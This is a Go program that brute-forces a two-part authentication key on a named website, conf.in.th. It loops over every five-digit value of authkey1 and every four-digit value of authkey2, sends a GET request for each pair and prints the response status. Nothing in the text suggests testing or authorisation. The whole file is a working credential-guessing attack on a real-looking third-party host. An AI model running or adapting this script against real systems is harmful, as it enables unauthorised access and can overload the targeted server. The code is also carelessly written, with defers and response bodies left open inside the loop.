package main

import (
        "fmt"
        //"io/ioutil"
        "log"
        "net/http"
)

func main() {
        MAX1 := 99999
        MAX2 := 9999
        for key1 := 10000; key1 <= MAX1; key1++ {
                for key2 := 1000; key2 <= MAX2; key2++ {
                        urlStr := fmt.Sprintf("http://www.conf.in.th/?authkey1=%d&authkey2=%d", key1, key2)
                        log.Printf("[%d][%d]send GET [%s]", key1, key2, urlStr)

                        client := &http.Client{}
                        req, err := http.NewRequest("GET", urlStr, nil) // <-- URL-encoded payload
                        if err != nil {
                                defer func() {
                                        recover()
                                        log.Printf("Can'thttp.NewRequest\n")
                                }()
                                panic(err)
                        }

                        resp, err := client.Do(req)
                        if err != nil {
                                defer func() {
                                        recover()
                                        log.Printf("Can't client.Do(req)\n")
                                }()
                                panic(err)
                        }
                        fmt.Println(resp.Status)
                        defer resp.Body.Close()
                        /*
                                body, err := ioutil.ReadAll(resp.Body)
                                if err != nil {
                                        log.Fatal(err)
                                }
                                fmt.Println(string(body))
                        */
                }
        }
}
